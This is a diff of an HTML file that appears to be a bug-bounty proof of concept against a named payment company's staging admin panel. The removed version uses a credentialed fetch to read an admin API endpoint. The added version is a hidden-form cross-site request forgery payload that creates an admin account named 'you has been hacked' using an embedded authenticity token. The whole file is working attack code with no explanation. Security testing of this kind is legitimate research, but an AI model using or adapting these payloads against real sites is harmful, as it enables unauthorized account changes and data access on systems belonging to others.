@@ -1,23 +1,10 @@
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-
-<body>
-    <script>
-
-        fetch('https://yeswehack.staging.komoju.com/admin/api/v1/banners', {
-            method: 'GET',
-            credentials: 'include' // Jika perlu mengirim cookie sesi
-        })
-            .then(response => response.text())
-            .then(data => console.log(data))
-            .catch(error => console.error('Error:', error));
-    </script>
-</body>
-
-</html>
+<html>
+	<body>
+		<form method="POST" action="https://yeswehack.staging.komoju.com/admin/accounts?account_id=3gnp472m14nhb3ooy9c86b7id&mode=test">
+			<input type="hidden" name="authenticity_token" value="sxrjMSDQpyyTNT1FMtY_PkGDw4KDkWgo1ayuzX1wDREjdLv9jSVsS7UcmQU14r0zxKpbmgIavN8a505Mlln8kw"/>
+			<input type="hidden" name="account%5Bname%5D" value="you+has+been+hacked"/>
+			<input type="hidden" name="commit" value="Create+Account"/>
+			<input type="submit" value="Submit">
+		</form>
+	</body>
+<html>
